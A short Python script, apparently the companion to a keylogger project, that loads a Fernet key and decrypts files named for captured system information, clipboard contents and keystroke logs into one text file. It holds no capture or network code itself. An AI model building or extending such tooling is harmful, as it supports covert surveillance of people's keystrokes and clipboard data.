from cryptography.fernet import Fernet
import os

file_extend = os.getcwd()
extend = "\\"
encryption_information = "encryiption_key.txt"

with open(file_extend+extend+encryption_information , "rb") as f:
    key = f.read()
    print(key)
system_information_e = "e_sysinfo.txt"
clipboard_information_e = "e_clipboard.txt"
keys_information_e = "e_log.txt"

encrypted_files = [system_information_e , clipboard_information_e , keys_information_e]
count = 0

for decrypting_files in encrypted_files:
    with open(encrypted_files[count] , 'rb') as f:
        data = f.read()
    
    fernet = Fernet(key)
    decrypted = fernet.decrypt(data)

    with open("decryption.txt" , 'ab') as f:
        f.write(decrypted)
    
    count+=1